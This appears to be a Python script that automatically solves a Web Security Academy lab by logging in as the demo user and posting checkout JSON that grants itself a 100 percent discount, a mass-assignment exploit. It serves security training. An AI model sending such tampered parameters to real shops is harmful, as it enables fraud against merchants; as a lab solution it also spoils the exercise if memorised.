from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter")

    # JSON found at "GET /api/checkout"
    json = {
        "chosen_discount": {"percentage": 100},
        "chosen_products": [{"product_id": "1", "quantity": 1}],
    }

    session.post_path("/api/checkout", json=json)
    logger.info("Sent a POST request to /api/checkout with the following JSON:")
    logger.info(json)
